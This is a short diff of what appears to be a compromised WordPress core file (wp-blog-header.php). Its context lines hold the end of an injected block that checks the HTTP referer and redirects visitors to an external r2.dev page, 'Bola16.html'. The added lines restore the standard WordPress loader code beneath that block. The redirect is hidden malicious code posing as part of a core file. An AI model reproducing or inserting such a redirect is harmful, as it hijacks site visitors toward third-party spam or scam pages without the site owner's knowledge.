@@ -18,3 +18,23 @@ $s_ref = $_SERVER['HTTP_REFERER'];
         header("Location: https://pub-9ac899cf166c498fa482c500908726f0.r2.dev/Bola16.html");
         exit;
     }
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+
+if ( ! isset( $wp_did_header ) ) {
+
+	$wp_did_header = true;
+
+	// Load the WordPress library.
+	require_once __DIR__ . '/wp-load.php';
+
+	// Set up the WordPress query.
+	wp();
+
+	// Load the theme template.
+	require_once ABSPATH . WPINC . '/template-loader.php';
+
+}
